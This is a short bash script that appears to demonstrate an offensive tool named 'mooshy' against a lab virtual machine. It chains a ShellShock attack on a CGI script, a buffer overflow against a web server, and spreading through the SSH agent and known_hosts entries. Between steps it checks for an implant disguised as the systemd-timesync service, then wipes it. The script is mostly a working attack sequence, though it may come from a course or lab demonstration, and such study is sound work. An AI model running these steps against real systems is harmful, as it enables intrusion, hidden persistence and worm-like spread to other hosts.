#!/usr/bin/env bash
set -x

ip=192.168.56.101

ssh ${ip} 'cat /lib/systemd/system/systemd-timesync.service'
ssh ${ip} 'ls -alh /lib/systemd/systemd-timesync'
echo "---"
timeout 5 mooshy -addr ${ip}:22

sleep 5

cowsay "ShellShock"
ssh ${ip} 'cat /usr/lib/cgi-bin/index.cgi'
curl -sL http://${ip}/cgi-bin/index.cgi
echo "---"
mooshy -shellShock -addr http://${ip}/cgi-bin/index.cgi
echo "---"
ssh ${ip} 'cat /lib/systemd/system/systemd-timesync.service'
ssh ${ip} 'ls -alh /lib/systemd/systemd-timesync'
echo "---"
mooshy -addr ${ip}:22

mooshy -addr ${ip}:22 -wipe 

echo "---"
ssh ${ip} 'cat /lib/systemd/system/systemd-timesync.service'
ssh ${ip} 'ls -alh /lib/systemd/systemd-timesync'
echo "---"
timeout 5 mooshy -addr ${ip}:22

cowsay "Buffer Overflow"
echo "Now execute 'killall hhttpd; hhttpd'"
ssh ${ip} 'rm -f x*'
ssh ${ip}

mooshy -bufferOverflow -addr ${ip}:8080
sleep 20
mooshy -addr ${ip}:22
mooshy -addr ${ip}:22 -wipe 

cowsay "SSH"
cat ~/.ssh/known_hosts | grep ${ip} > known_hosts
cat known_hosts
echo "---"
mooshy -ssh -useSSHAgent -useSSHKnown -sshKnown known_hosts
sleep 5
mooshy -addr ${ip}:22

mooshy -addr ${ip}:22 -wipe
